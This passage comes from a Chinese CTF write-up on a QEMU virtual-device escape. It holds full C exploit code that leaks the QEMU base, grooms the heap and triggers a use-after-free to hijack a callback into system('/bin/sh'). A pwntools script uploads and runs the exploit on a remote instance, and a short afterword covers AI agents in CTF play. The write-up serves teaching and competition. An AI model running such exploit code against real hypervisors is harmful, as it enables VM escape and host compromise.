            close(config_fd);
            exit(EXIT_FAILURE);
        }
    }

    if (pread(config_fd, &command, sizeof(command), 0x04) != sizeof(command)) {
        perror("verify PCI_COMMAND");
        close(config_fd);
        exit(EXIT_FAILURE);
    }

    close(config_fd);

    if (!(command & 0x0004)) {
        fprintf(stderr, "Failed to enable Bus Master: %s\n", devices[id]);
        exit(EXIT_FAILURE);
    }
}

static void init(void)
{
    for (int i = 0; i < DEVICE_COUNT; i++) {
        open_pci_device(i);
        pci_enable_bus_master(i);
    }
}

void fini(void)
{
    for (int i = 0; i < DEVICE_COUNT; i++) {
        munmap((void *)mmio[i], MMIO_SIZE);
        close(fd[i]);
    }
}

void *init_buf(void)
{
    void *buf = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    if (buf == MAP_FAILED) {
        perror("mmap");
        exit(1);
    }

    memset(buf, 0, 0x1000);

    if (mlock(buf, 0x1000) < 0) {
        perror("mlock");
        exit(1);
    }

    return buf;
}

void exploition(void)
{
    uint64_t qemu_base = 0;
    uint64_t system_plt = 0;
    unsigned char *buffer = init_buf();

    // step1: leak qemu_base
    ctf_logger_set_offset(0x1010);
    ctf_logger_set_length(0x10);
    ctf_logger_set_dma_addr((uint64_t)virt_to_phys((const void *)buffer));
    ctf_logger_copy();

    qemu_base = *(uint64_t *)(&buffer[8]) - 0x4132C7;
    system_plt = qemu_base + 0x2E2C94;
    printf(SUCCESS_MSG("[+] qemu_base: 0x%lx\n"), qemu_base);
    printf(INFO_MSG("[*] system_plt_addr: 0x%lx\n"), system_plt);
    putchar('\n');

    // step2:alloc shared object from vCPU thread arena and fill tcache[0x60]
    for (int i = 0; i < 8; i++) {
        ctf_watchdog_destroy();
        ctf_watchdog_ensure();
    }

    // step3: UAF while ctf_nic_handle_rx()
    CTFNICRxDesc *payload1 = (CTFNICRxDesc *)buffer;
    payload1->buffer1_gpa = pci_bar0[CTF_WATCHDOG] + 0x28; // ctf_watchdog_destroy
    payload1->length1 = 4;
    payload1->buffer2_gpa = pci_bar0[CTF_AUDIO]; // ctf_audio_allocate
    payload1->length2 = 4;
    payload1->completion_gpa = pci_bar0[CTF_AUDIO] + 0x14; // ctf_audio_dma_write_buffer

    CTFSharedObject *payload2 = (CTFSharedObject *)(buffer + sizeof(CTFNICRxDesc));
    strncpy(payload2->message, "/bin/sh", sizeof(payload2->message));
    payload2->callback = (void *)system_plt;

    ctf_nic_set_rx_desc_gpa((uint64_t)virt_to_phys((const void *)payload1));
    ctf_audio_set_dma_addr((uint64_t)virt_to_phys((const void *)payload2));
    ctf_audio_set_dma_len(0x50);

    ctf_nic_handle_rx(); // trigger attack!
}

int main(void)
{
    init();
    exploition();
    fini();
    return 0;
}
```

以及，远程环境没有base64命令，但是有uuencode和uudecode命令，可以写一个特化的发送脚本：

```py
from pwn import *
import subprocess

# Configuration
is_root = True
storage_location = "/root"

# context.log_level = "debug"

prompt = "/ #" if is_root else "/ $"
uu_file = f"{storage_location}/exp.uu"
exp_file = f"{storage_location}/exploit"

exp = subprocess.check_output(["uuencode", "-m", "./exp", "exploit"])


p = remote("127.0.0.1", 10719)
# p = process('./run.sh')
p.sendline()
p.recvuntil(prompt.encode())

p.sendline(f"rm -f {uu_file} {exp_file}".encode())
p.recvuntil(prompt.encode())

count = 0
sum_ = (len(exp) + 0x1FF) // 0x200
for i in range(0, len(exp), 0x200):
    p.sendline(b'echo -n "' + exp[i : i + 0x200] + f'" >> {uu_file}'.encode())
    count += 1
    if count % max(1, sum_ // 10) == 0:
        log.info(f"count: {count} / {sum_}")
    p.recvuntil(prompt.encode())

p.sendline(f"uudecode -o {exp_file} {uu_file}".encode())
p.recvuntil(prompt.encode())

p.sendline(f"chmod +x {exp_file}".encode())
p.recvuntil(prompt.encode())

p.sendline(exp_file.encode())
p.interactive()
```

展示一下本地docker镜像的利用结果吧：
![exploit](/images/QWBez_qemu-WP/exploit.png)

## 后记

距离 AI 统治 CTF 比赛也有一段时间了，大家拼的都是谁的智能体更先进、更智能。本次强网杯线上赛，我们取得了一个三等奖。大伙都用 GPT daybreak blue。而我，拿着一个像是没开智的 Deepseek，在大家在熬夜过后都在睡觉的上午，凑巧出了这么一道题，也只出了这一道题。但 AI 写的 exp 终究不是自己的，我就自己又手搓了一个 exp，简直就像是上世纪的古人干的事情。但，如果停止学习的话，恐怕更早就被淘汰了。所以，还不错。
